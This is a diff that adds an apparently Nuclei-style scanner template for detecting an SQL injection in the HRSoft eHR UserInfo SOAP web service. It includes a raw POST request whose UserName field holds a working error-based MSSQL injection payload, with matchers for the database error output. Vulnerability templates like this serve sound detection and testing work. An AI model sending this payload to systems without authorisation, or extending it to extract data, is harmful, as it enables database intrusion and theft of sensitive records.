@@ -1,0 +1,47 @@
+id: hrsoft-ehr-userinfo-sqli
+info:
+  name: HRSoft eHR UserInfo SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    The vulnerability allows SQL injection in the HRSoft eHR system via the UserInfo WebService. Exploitation can disclose sensitive information from the database.
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - raw:
+      - |
+        POST /ws/ZFMCWs/ZFMCWebService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/UserInfo"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <UserInfo xmlns="http://tempuri.org/">
+              <UserName>') AND 1004 IN (SELECT +sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')))-- OOxB</UserName>
+              <DeptName>rt</DeptName>
+            </UserInfo>
+          </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "SqlException"
+          - "0x{{t2}}"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
